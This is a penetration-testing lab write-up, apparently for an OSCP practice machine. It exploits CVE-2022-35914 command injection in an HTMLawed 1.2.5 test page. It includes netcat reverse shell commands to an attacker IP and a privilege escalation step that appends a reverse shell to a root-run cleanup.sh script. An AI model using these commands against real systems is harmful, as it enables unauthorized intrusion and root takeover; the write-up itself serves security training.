# Information Gathering 

Nmap Scans:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-21 22:05 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
Initiating Ping Scan at 22:05
Scanning 192.168.165.190 [4 ports]
Completed Ping Scan at 22:05, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:05
Completed Parallel DNS resolution of 1 host. at 22:05, 0.55s elapsed
Initiating SYN Stealth Scan at 22:05
Scanning 192.168.165.190 [65535 ports]
Discovered open port 80/tcp on 192.168.165.190
Discovered open port 22/tcp on 192.168.165.190
SYN Stealth Scan Timing: About 28.04% done; ETC: 22:07 (0:01:20 remaining)

==🟡Available ports 22, 80==

Gobuster Results:

No subdomains found.

When accessing the target IP address we are landed on a "HTMLawed 1.2.5 Test" page. If you have performed some of TJ Null's recommended OSCP boxes, you may have seen a similar format in the "GLPI" box. 

However, we will treat this target IP as any other machine. 

Knowing the available version information about the website, we can research any known vulnerabilities for the target IP version number.

Luckily, there is a known vulnerability,  CVE-2022-35914, that can help with exploitation of the machine.

# Service Enumeration

To perform the exploit on the machine we need to follow the proof of concept found on Mayfly's Github (credit to author) -> https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/

This detailed explanation describes a method of attack that makes use of command injection within the htmLawed function due to the similar format with the php "exec" command format. 

When exploiting this machine, the only change we need to make is to the intended IP address GET destination when adding our commands. 

For example, when clicking on the "process" button, the website directly attempts to send the GET request to http://192.168.XXX.XXX/htmLawedTest.php . When this request is sent successfully, we receive an error page, "Not Found." Instead, we found that the request needs to be intercepted with Burp Suite and re-routed to http://192.168.XXX.XXX/ without the .php file attached. 

With this, we are able to achieve successful command injection and post a reverse shell command to land a foothold on the target machine.

Reverse Shell command:

	nc 192.168.XXX.XXX 4444 -e sh

The local flag can be found in the user's home directory. 

# Privilege Escalation

To perform proper investigation on the machine, we need to upgrade our current shell to a more interactive version. After multiple attempts, the command we found that works the best for a shell upgrade is

	SHELL=/bin/bash script -q /dev/null

This command will allow the user to move around the current machine with ease. 

Now that we have a proper established foothold, we can investigate potential privilege escalation points. 

One main point of interest on this machine is a script found in the home directory called, "cleanup.sh." When opening the script we can see two bash commands being run to remove files in the "apache" directory.  Since bash commands are being run, we can check the full path of "apache" to see the permissions required to make changes on the file.

To our surprise, root privileges are required to make changes on this directory. In this case, we can attempt to add a reverse shell command to the file and attempt a connection to our local host. 

Since the file is being executed with root privileges, the reverse shell will open as the root user. 

We add

	echo 'nc -c sh 192.168.XXX.XXX 4444' >> cleanup.sh

*This format follows a similar format as our original listener, but makes use of the netcat -c flag.

Now we can run start a listener on our local host port 4444 and execute the cleanup.sh file on the target machine.

	bash cleanup.sh

Success! We have received a connection from the target and are now logged in as root.

The proof.txt flag can be found in the home directory. The machine is now solved.
